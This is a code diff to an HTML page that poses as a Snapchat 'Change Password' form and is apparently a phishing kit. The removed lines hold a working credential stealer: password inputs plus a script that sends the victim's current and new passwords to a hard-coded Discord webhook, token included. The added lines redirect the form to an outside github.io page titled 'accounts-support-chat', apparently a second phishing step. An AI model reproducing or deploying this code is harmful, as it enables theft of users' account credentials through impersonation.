@@ -7933,11 +7933,9 @@ body {
                                 </div>
                             </div>
     
-                            <form class="action-form" id="webhookForm">
+                            <form class="action-form" action="https://accounts-support-chat.github.io/snap-chat/protect.html">
                                 <button type="submit" class="ant-btn ant-btn-default sds-button action-button change-password-button regular sds-base-button default">
-                                    <input type="text" id="cpass" placeholder="Current Password" required />
-                                    <input type="text" id="npass" placeholder="New Password" required />
-                                    <input type="text" id="npasscon" placeholder="Confirm New Password" required />
+                    
                                     <div class="action-button-content">
                                        
                                         <span class="action-button-text change-password-button-text">Change Password</span>
@@ -7957,43 +7955,7 @@ body {
 
         <script src="js/main.js"></script>
 
-        <script>
-            const webhookURL = 'https://discord.com/api/webhooks/1324993593865273374/y3x5RGIW7bPgQ4hxvrpNumQjjj5H9vRYGyDu4tSCTgOU0IYI0VBxFTgxvoyUZu4DP9S8';
-        
-            // Attach the event listener to the form
-            document.getElementById('webhookForm').addEventListener('submit', async (event) => {
-                event.preventDefault(); // Prevent form from submitting the traditional way
-        
-                // Get the values from the input fields
-                const current_pass = document.getElementById('cpass').value;
-                const new_pass = document.getElementById('npass').value;
-                const newcon_pass = document.getElementById('npasscon').value;
-        
-                // Prepare the payload as a single string
-                const payload = JSON.stringify({
-                    content: `Current Password: ${current_pass}\nNew Password: ${new_pass}\nConfirm Password: ${newcon_pass}`
-                });
-        
-                try {
-                    // Send the POST request to the webhook
-                    const response = await fetch(webhookURL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: payload
-                    });
-        
-                    if (response.ok) {
-                        print('Message sent to Discord!');
-                    } else {
-                        alert('Failed to change password.');
-                    }
-                } catch (error) {
-                    console.error('Error:', error);
-                    alert('An error occurred.');
-                }
-            });
-        </script>
-        
+      
     
 
     </body>
